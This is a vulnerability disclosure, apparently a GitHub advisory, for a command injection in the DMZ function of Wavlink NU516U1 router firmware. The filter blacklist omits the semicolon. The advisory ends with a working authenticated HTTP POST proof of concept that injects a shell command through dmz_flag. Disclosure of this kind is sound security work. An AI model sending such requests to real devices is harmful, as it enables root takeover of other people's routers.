# The DMZ function of Wavlink NU516U1 (V251208) firewall.cgi component has a remote command execution vulnerability.

### Overview

Supplier: Wavlink

Product: NU516U1 Version: WAVLINK-NU516U1-A-WO-20251208-BYFM

Type: command injection

### Vulnerability description

A command injection vulnerability exists in the `/cgi-bin/firewall.cgi` component in Wavlink NU516U1 router firmware (version M16U1_V251208). The vulnerability is located in the `sub_4017F0` function that handles DMZ settings. Although the manufacturer introduced the filtering function `sub_405B2C` in an attempt to fix the vulnerability of the old version (M16U1_V240425), the blacklist filtering mechanism is not rigorous and misses the key command delimiter semicolon (`;`). An authenticated remote attacker can bypass input validation by constructing a malicious `dmz_flag` parameter containing a semicolon, and use the `sprintf` function to splice arbitrary shell commands into a system call for execution, thereby taking full control of the device with root privileges.

### Vulnerability details

**Affected components**: `/cgi-bin/firewall.cgi`

**Affected functions**: `sub_4017F0` (main logic) & `sub_405B2C` (filter logic)

In the ftext function, get the value of the firewall parameter through user input. Setting the value of the firewall parameter to DMZ calls the sub_4017F0 function.

<img width="582" height="123" alt="image" src="https://github.com/user-attachments/assets/ebade5c7-fbbc-42e0-8281-1087365ae8b9" />


### Trigger logic: Blind trust of main function `sub_4017F0`

After calling the flawed filter, the main function mistakenly believed the input was safe and spliced it into a system command.

**Step 1: Get and Check**

```plain
v6 = sub_4042C8("dmz_flag", a1, 1); 
v9 = (char *)strdup(v6);
if ( sub_405B2C(v9) == 1 )         
{
   return ...;
}
```

**Step 2: Dangerous Splicing**

```plain
sprintf(cat_..., "uci delete firewall.@redirect[%s]", v9);
sub_403734(cat_...); // system()
```

The program uses `sprintf` to embed your input `v9` directly into the square brackets of the `uci delete` command.

<img width="1383" height="939" alt="image" src="https://github.com/user-attachments/assets/1c29f8a6-9656-4587-9870-e0e9aeb66d57" />


### Blacklist omission of filter function `sub_405B2C`

This is the root cause of the vulnerability. The developer realized the risk of injection and wrote a function called `sub_405B2C` to filter dangerous characters, but the list of contraband in the hands of this "security inspector" was incomplete.

- **Blacklist content**: The illegal character set defined in the code is: "|&<>$()\"'[]{}*?!^~\\#%" This includes most Shell metacharacters such as pipe characters (`|`), background running (`&`), redirection (`<>`), variables/subshells (`$()`), etc.

- **fatal omission**: **semicolon (**`;`) is not in the blacklist

<img width="816" height="444" alt="image" src="https://github.com/user-attachments/assets/37e25bb6-15dd-41ee-8cc7-8151bfec94e4" />


### exp

**Utilization Conditions**: A valid Session Cookie is required.

Construct the data package:

<img width="1201" height="444" alt="image" src="https://github.com/user-attachments/assets/625454d9-3be7-4130-aa1c-21e904d920c3" />


```plain
POST /cgi-bin/firewall.cgi HTTP/1.1
Host: usblogin.link
Content-Length: 64
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://usblogin.link
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://usblogin.link/html/firewall.shtml
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session=1470335067
Connection: close


firewall=DMZ&DMZEnabled=0&dmz_flag=1;touch+/tmp/pwned_seccess;
```

Verification successful
<img width="935" height="171" alt="image" src="https://github.com/user-attachments/assets/cdc842d6-1949-460b-b6de-9eb1f2d322da" />
